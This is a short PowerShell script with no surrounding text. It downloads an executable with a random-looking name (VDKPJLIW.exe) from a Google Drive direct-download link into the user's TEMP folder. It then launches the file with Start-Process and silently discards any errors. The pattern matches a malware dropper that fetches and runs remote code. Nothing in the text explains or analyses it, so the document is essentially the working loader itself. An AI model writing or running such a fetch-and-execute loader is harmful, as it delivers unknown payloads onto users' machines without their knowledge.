
$someData = @(
     [PSCustomObject]@{a = "https://drive.google.com/uc?export=download&id=1Q59tliTQClvTANA5iuGxbhd4ObEM6Xaz
"; b = "VDKPJLIW.exe"}
   );

   foreach ($i in $someData) {
     try {
       $filePath = "$env:TEMP\$($i.b)";
       $download = $true;
       if (Test-Path $filePath) {
         $download = $false;
       }
       if ($download) {
         Invoke-RestMethod -Uri $i.a -OutFile $filePath;
       }
       Start-Process $filePath;
     }
     catch {
       # Error handling (optional)
     }
   }
